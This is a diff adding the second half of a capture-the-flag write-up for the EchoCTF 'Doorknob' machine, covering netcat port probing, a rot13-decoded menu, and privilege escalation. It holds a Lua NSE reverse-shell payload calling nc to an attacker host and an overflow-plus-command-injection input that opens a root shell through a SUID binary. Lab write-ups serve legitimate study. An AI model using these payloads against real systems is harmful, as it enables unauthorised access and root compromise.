@@ -187,3 +187,168 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Mon Feb 20 12:47:55 2023 -- 1 IP address (1 host up) scanned in 158.36 seconds 
 ```
 
+cool we've got some ports open, let's check them out one by one.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/EchoCTF/Doorknob]
+└─$ nc -vn 10.0.30.92 3753
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Connected to 10.0.30.92:3753.
+Operation mode
+INPUT: readline
+OUTPUT: EOL (\n)
+INPUT: omo
+OUTPUT: omo
+^C
+```
+using nc banner grabber to connect to this port, got nothing. let's move to the other port.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/EchoCTF/Doorknob]
+└─$ nc -vn 10.0.30.92 5900
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Connected to 10.0.30.92:5900.
+Welcome to the jetbridge control
+Username: omo
+Password: omo
+
+Invalid username  omo
+
+ _____________________________
+< Hey hey you've been warned! >
+ -----------------------------
+    \
+     \
+                                   .::!!!!!!!:.
+  .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$# 
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R" 
+        "*$bd$$$$      '*$$$$$$$$$$$o+#" 
+             """"          """"""" 
+Welcome to the jetbridge control
+Username: ^C
+         
+```
+moving to the second port `5900` it requires creds to login, which we don't have any. let check the next port `5901`.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/EchoCTF/Doorknob]
+└─$ nc -vn 10.0.30.92 5901
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Connected to 10.0.30.92:5901.
+Enter decryption key:omo
+
+/services/central-control.functions: line 72: syntax error near unexpected token `fi'
+/services/central-control.functions: line 72: `      fi'
+1. Pbageby Gbjre Bcrengvbaf
+2. Grezvany Bcrengvbaf
+3. RKVG
+
+^C
+```
+moving to the third port `5901` was asking for a decryption key which we dont have any, so putting a random value gave us some ciphered text. let's use [cyberchef](https://gchq.github.io/CyberChef/) to decode the texts.
+
+![image](https://user-images.githubusercontent.com/87468669/220105921-a4d62985-4d78-44d2-ae6b-09151345e0b4.png)
+
+decode the texts from `rot13` and we got something sus. let's keep it in our note. moving to the forth port
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/EchoCTF/Doorknob]
+└─$ nc -vn 10.0.30.92 5902
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Connected to 10.0.30.92:5902.
+ _____________________________________
+/ Network Mapper Server (works better \
+\ with telnet)                        /
+ -------------------------------------
+    \
+     \
+                                   .::!!!!!!!:.
+  .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$# 
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R" 
+        "*$bd$$$$      '*$$$$$$$$$$$o+#" 
+             """"          """"""" 
+Provide an NSE. CTRL+D to end
+
+nse
+^C
+```
+moving to port `5902` it requires us to input an nse, which is an nmap script writen in lua. let's search nse payload to use.
+
+![image](https://user-images.githubusercontent.com/87468669/220110605-28d6763e-631c-4ee1-a2e7-c4f34d931d01.png)
+
+reconnected to the port using telnet, and used nse payload `os.execute("nc -c /bin/bash 10.10.1.50 1337")`, fire up ncat listener and used ctrl+d to trigger the payload and boom! we got a reverse shell.
+
+```
+nmap@doorknob:/home/nmap$ id 
+uid=5902(nmap) gid=65534(nogroup) groups=65534(nogroup)
+nmap@doorknob:/home/nmap$ cd ../
+nmap@doorknob:/home$ ls -al
+total 32
+drwxr-xr-x 1 root        root    4096 Nov 25  2020 .
+drwxr-xr-x 1 root        root    4096 Feb 20 12:40 ..
+drwxr-xr-x 2 ETSCTF      nogroup 4096 Nov 25  2020 ETSCTF
+drwx------ 2 brainfucksh nogroup 4096 Nov 25  2020 brainfucksh
+drwx------ 2 control     nogroup 4096 Nov 25  2020 control
+drwx------ 2 cservice    nogroup 4096 Nov 25  2020 cservice
+drwx------ 2 jetbridge   nogroup 4096 Nov 25  2020 jetbridge
+drwx------ 2 nmap        nogroup 4096 Nov 25  2020 nmap
+nmap@doorknob:/home$ 
+```
+
+
+## Privilege Escalation
+
+```
+nmap@doorknob:/home$ find / -perm -u=s -type f 2>/dev/null
+/bin/su
+/bin/umount
+/bin/mount
+/bin/ping
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/src/brainfucksh/suidflow
+nmap@doorknob:/home$ ls -al /usr/src/brainfucksh/suidflow
+-rwsr-sr-x 1 root root 696928 Nov 25  2020 /usr/src/brainfucksh/suidflow
+nmap@doorknob:/home$
+```
+checking for suid, we saw that `/usr/src/brainfucksh/suidflow` is an suid bin file. let's exploit this file.
+
+```
+nmap@doorknob:/home$ 
+nmap@doorknob:/home$ /usr/src/brainfucksh/suidflow 
+Guess the word i'm thinking and you win a shell...
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+SUCCESS! Here is my gift to you...
+sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAA: not found
+nmap@doorknob:/home$ /usr/src/brainfucksh/suidflow 
+Guess the word i'm thinking and you win a shell...
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;id
+SUCCESS! Here is my gift to you...
+sh: 1: AAAAAAAAAAAAAAAAAA: not found
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+nmap@doorknob:/home$ /usr/src/brainfucksh/suidflow 
+Guess the word i'm thinking and you win a shell...
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;/bin/bash
+SUCCESS! Here is my gift to you...
+sh: 1: AAAAAAAAAAAAAAAAAAAAAAAA: not found
+root@doorknob:/home# id 
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+root@doorknob:/home# 
+```
+by doing a simple buffer ovrflow with payload `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;/bin/bash`, we got root shell.
+
+![image](https://user-images.githubusercontent.com/87468669/220117229-db1a5a0f-5b68-4405-bc4c-1692c94f93e3.png)
+
+and we are through 
+
